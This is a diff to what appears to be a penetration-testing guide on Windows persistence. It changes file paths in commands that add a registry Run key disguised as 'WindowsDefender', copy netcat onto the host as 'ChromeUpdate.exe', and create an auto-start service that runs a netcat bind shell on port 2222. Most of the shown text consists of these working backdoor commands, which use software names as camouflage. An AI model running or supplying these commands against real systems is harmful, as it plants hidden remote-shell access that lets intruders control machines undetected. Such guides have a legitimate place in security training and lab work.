@@ -98,7 +98,7 @@ Shift this on the Windows host `C:\Windows\System32\WindowsDefender.exe`
 Open `cmd.exe` and run:
 
 ```
-reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" /v WindowsDefender /t REG_SZ /d "C:\Windows\System32\WindowsDefender.exe"
+reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" /v WindowsDefender /t REG_SZ /d "C:\Program Files\Defender\WindowsDefender.exe"
 ```
 
 <br/>
@@ -109,7 +109,7 @@ reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" /v Wi
 
 ### Kali Linux
 
-Copy the `nc.exe` in `/usr/share/windows-binaries/nc.exe` to the Windows host `C:\Windows\System32\ChromeUpdate.exe`.
+Copy the `nc.exe` in `/usr/share/windows-binaries/nc.exe` to the Windows host `C:\ProgramData\Chrome\ChromeUpdate.exe`.
 
 <br/>
 
@@ -118,7 +118,7 @@ Copy the `nc.exe` in `/usr/share/windows-binaries/nc.exe` to the Windows host `C
 Create a service and start the service:
 
 ```
-sc create ChromeUpdateService binpath= "cmd.exe /k C:\Windows\System32\ChromeUpdate.exe -L -p 2222 -e cmd.exe" start= auto
+sc create ChromeUpdateService binpath= "cmd.exe /k C:\ProgramData\Chrome\ChromeUpdate.exe -L -p 2222 -e cmd.exe" start= auto
 ```
 
 <br/>
